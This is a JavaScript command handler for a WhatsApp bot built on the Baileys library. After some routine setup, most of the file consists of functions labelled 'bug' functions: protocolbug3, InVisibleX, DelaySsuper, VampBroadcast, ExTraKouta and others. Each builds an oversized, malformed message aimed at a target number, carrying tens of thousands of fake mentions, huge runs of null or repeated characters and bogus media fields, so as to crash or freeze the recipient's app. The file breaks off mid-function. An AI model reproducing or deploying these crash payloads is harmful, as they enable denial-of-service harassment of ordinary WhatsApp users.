require('../setting/config');

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const FormData = require("form-data");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, downloadAndSaveMediaMessage, useMultiFileAuthState, downloadMediaMessage, generateWAMessageFromContent, generateMessageID, getContentType, prepareWAMessageMedia, downloadContentFromMessage, generateRandomMessageId } = require("@whiskeysockets/baileys");
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
module.exports = asep = async (asep, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
  m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
  ''
);
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
function getDisplayName(id) {
    let contact = store.contacts[id] || {};
    return contact.name || contact.verifiedName || '@' + id.split('@')[0];
}
const isPremium = premium.includes(m.sender)
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
// Consta Variable
const sender = m.key.fromMe
  ? (asep?.user?.id?.split(":")[0] || asep?.user?.id?.split(":")[0]) + "@s.whatsapp.net"
  : (m.key.participant || m.key.remoteJid);
const senderNumber = sender?.split('@')[0];
const senderName = "@" + senderNumber;
const botNumber = await asep.decodeJid(asep.user.id);
const isCmd = typeof body === 'string' && body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const blockedNum = [
  "6283862861689",
  // Tambahkan nomor lainnya di sini (tanpa @s.whatsapp.net)
];


// Group function
const groupMetadata = isGroup ? await asep.groupMetadata(m.chat).catch((e) => ({})) : {};
const groupOwner = isGroup ? groupMetadata.owner || "" : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const speed = require('performance-now')
const os = require("os")
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, sleep } = require('./lib/myfunction');
// Foto
let image = fs.readFileSync('./start/lib/media/domain.jpg')
var ppuser
try {
ppuser = await asep.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = `${imgmenu}`
}
// Time
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')

async function CatBox(filePath) {
  try {
    if (!fs.existsSync(filePath)) throw new Error("File not found");

    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', fs.createReadStream(filePath));

    const res = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });

    if (res.status === 200 && res.data) {
      return res.data.trim();
    } else {
      throw new Error(`Upload failed with status: ${res.status}`);
    }
  } catch (err) {
    throw new Error(`Upload failed: ${err.message}`);
  }
}


// Console log
if (m.message) {
  console.log(chalk.hex("#8A2BE2")("╔═━━「 ⚡︎ Reflyas ⚡︎ 」━━═╗"));
  console.log(chalk.hex("#00FF00")("┋ 📩 𝐏𝐞𝐬𝐚𝐧 𝐁𝐚𝐫𝐮 𝐃𝐢𝐝𝐞𝐭𝐞𝐤𝐬𝐢!"));
  console.log(chalk.hex("#8A2BE2")("╟─────────────────────────────────────"));
  console.log(chalk.hex("#FFD700")("┋ 📅 𝐓𝐚𝐧𝐠𝐠𝐚𝐥 : ") + chalk.cyan(new Date().toLocaleString()));
  console.log(chalk.hex("#FFD700")("➩ 💬 𝐏𝐞𝐬𝐚𝐧   : ") + chalk.white(m.body || m.mtype));
  console.log(chalk.hex("#FFD700")("➩ 👤 𝐏𝐞𝐧𝐠𝐢𝐫𝐢𝐦 : ") + chalk.magenta(pushname));
  console.log(chalk.hex("#FFD700")("➩ 🔢 𝐉𝐈𝐃      : ") + chalk.red(senderNumber));
  if (m.isGroup) {
      console.log(chalk.hex("#8A2BE2")("╟─────────────────────────────────────"));
      console.log(chalk.hex("#FFD700")("➩ 🏠 𝐆𝐫𝐮𝐩     : ") + chalk.green(groupName));
      console.log(chalk.hex("#FFD700")("➩ 🆔 𝐈𝐃 𝐆𝐫𝐮𝐩  : ") + chalk.red(m.chat));
  }
  console.log(chalk.hex("#8A2BE2")("╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝\n"));
}


if (global.autoTyping) {
if (command) {
asep.sendPresenceUpdate('composing', from)
}
}
asep.autoshalat = asep.autoshalat ? asep.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? asep.user.id : m.sender
	let id = m.chat 
    if(id in asep.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }

let example = (teks) => {
return `\nPenggunaan Salah Lek ❌
Contoh: ${prefix + command} ${teks}\n`
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363398216129063@newsletter`,
newsletterName: `Fart 𝙽𝚘𝚝 𝙳𝚎𝚟`,
jpegThumbnail: "https://files.catbox.moe/ctsxpn.jpg",
caption: '𝙰𝚗𝚝𝚒𝙷𝚎𝚛𝚘',
inviteExpiration: Date.now() + 1814400000
}
}}


let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
ping = `ping : ${latensi.toFixed(4)} × ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`

//variable gambar
const valensya = fs.readFileSync('./start/lib/media/domain.jpg')
//end

const text2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "🐉 𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒" }}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🐉 𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283862861689:+6283862861689\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const necroxenreply = (bokep) => { 
    asep.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
            'mentionedJid': [m.sender], 
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': "🐉 Refflay",
                'body': `🐉 𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒`,
                'previewType': "PHOTO",
                'thumbnailUrl': 'https://files.catbox.moe/ctsxpn.jpg',
                'sourceUrl': 'https://whatsapp.com/channel/0029VbAJy2SDJ6H6HCOH5s30'
            }
        }
    }, {
        'quoted': qkontak // Mengutip pesan sebelumnya
    });
};

const totalFitur = () =>{
var mytext = fs.readFileSync("./start/necroxen.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length
return numUpper
}

let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/WynzSta/Database/main/ApiClientV2.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

// function bug - func bug//
async function protocolbug3(asep, target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "REFLAYS",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "> -FatrCR",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function InVisibleX(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒",
                    footerText: "> -FatrCR",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await asep.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await asep.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "༑⌁⃰𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 *༑⌁",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }

async function DelaySsuper(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "> -FatrCR",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function DelayNewBug(target) {
        	try {
        		let messageObject = await generateWAMessageFromContent(target, {
        			viewOnceMessage: {
        				message: {
        					extendedTextMessage: {
        						text: "NECROXEN",
        						contextInfo: {
        							mentionedJid: Array.from({
        								length: 30000
        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        							isSampled: true,
        							participant: target,
        							remoteJid: "status@broadcast",
        							forwardingScore: 9741,
        							isForwarded: true
        						}
        					}
        				}
        			}
        		}, {});
        		await asep.relayMessage("status@broadcast", messageObject.message, {
        			messageId: messageObject.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: "meta",
        				attrs: {},
        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
        						content: undefined,
        					}],
        				}],
        			}],
        		});
        	} catch (err) {
        	}

        }

async function DelayInVis(target, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "#hay" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "#hay" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "#hay",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await asep.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await asep.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "𝐑𝐢𝐥𝐲𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𖤐 𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒𖤐",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Vampire Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug4(target, mention = true) {
    const glitchText = "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒".repeat(3000) + "\n" + "â€Ž".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `â•”â•â”â”â”âœ¥â—ˆâœ¥â”â”â”â•â•—\n  æƒ¡ðƒð„ðð€ð˜...| ð’ð”ðð†ðŽðƒððˆðŠð€â˜€\nâ•šâ•â”â”â”âœ¥â—ˆâœ¥â”â”â”â•â•\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await asep.relayMessage("status@broadcast", msg.message, {
    messageId: generateMessageID(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "> -FatirCR" + "ោ៝".repeat(10000),
        title: "FatirNotDeveloper",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/u/tamainfinity",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
